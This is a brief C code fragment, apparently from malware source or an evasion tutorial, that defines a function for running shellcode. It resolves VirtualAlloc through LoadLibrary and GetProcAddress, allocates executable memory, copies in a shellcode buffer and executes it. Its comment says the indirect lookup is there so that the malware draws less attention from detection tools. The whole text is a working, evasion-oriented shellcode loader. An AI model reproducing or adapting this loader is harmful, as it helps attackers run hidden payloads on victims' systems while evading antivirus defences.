// LoadLibrary and GetProcAddress win api function combination allows us to use all other win api functions, with this usage there will be no direct call to the memory manipulation function and malware will probably be less attractive.
void ExecuteShellcode(){
  HINSTANCE K32 = LoadLibrary(TEXT("kernel32.dll"));
  if(K32 != NULL){
    MYPROC Allocate = (MYPROC)GetProcAddress(K32, "VirtualAlloc");
    char* BUFFER = (char*)Allocate(NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(BUFFER, Shellcode, sizeof(Shellcode));
    (*(void(*)())BUFFER)();  
  }
}